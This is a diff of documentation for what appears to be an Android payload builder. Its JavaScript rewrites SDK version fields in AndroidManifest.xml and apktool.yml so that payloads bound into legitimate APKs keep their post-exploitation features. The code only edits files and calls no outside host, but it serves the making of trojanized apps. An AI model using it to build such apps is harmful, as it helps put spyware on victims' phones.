@@ -3,22 +3,41 @@ This code snippet is responsible for automatically changing the `apktool.yml` fi
 in order for the post-exoloitation features of the payload to work after after installing a Bound apk payload.
 - AppCtrl.js
 ```js
-fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
-    if (error) {
-        console.log("Failed Reading!");
-        return;
-    }
+                              $appCtrl.Log("Determining Target SDK Version...");
+                              $appCtrl.Log()
+                              fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
+                                if (error) {
+                                  $appCtrl.Log("Reading the Manifest Target SDK Failed.")
+                                  $appCtrl.Log()
+                                }
+                                
+                                $appCtrl.Log("Modifying the Target SDK Version...");
+                                $appCtrl.Log();
+                                var sdkRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
+                                var VerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
+                                var repSdk = data.replace(sdkRegex, "$122"+'"').replace(VerCoRegex, "$122"+'"');
+                                fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repSdk, 'utf8', (error) => {
+                                  if (error) {
+                                      $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
+                                      $appCtrl.Log();          
+                                      return;
+                                    }
 
-    var regex = /\b(targetSdkVersion:\s*')\d{1,2}'/g;
-    var replace = data.replace(regex, "$122'");
-    
-    fs.writeFile(path.join(apkFolder, 'apktool.yml'), replace, 'utf8', (error) => {
-        if (error) {
-            console.log("Failed Reading!");
-            return;
-        }
+                                    fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
+                                      if (error) {
+                                          $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
+                                          $appCtrl.Log();
+                                          return;
+                                      }
 
-    });
+                                      var regex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
+                                      var replace = data.replace(regex, "$122'");
+                                      fs.writeFile(path.join(apkFolder, 'apktool.yml'), replace, 'utf8', (error) => {
+                                        if (error) {
+                                            $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
+                                            $appCtrl.Log()
+                                            return;
+                                          }
 ```
 # Function to Empty the Apktool Framework Directory
 This Code will reduce building failed errors with both Standalone APK payloads and Bound APK Payloads, it empties the apktool framework directory before building any payload everytime
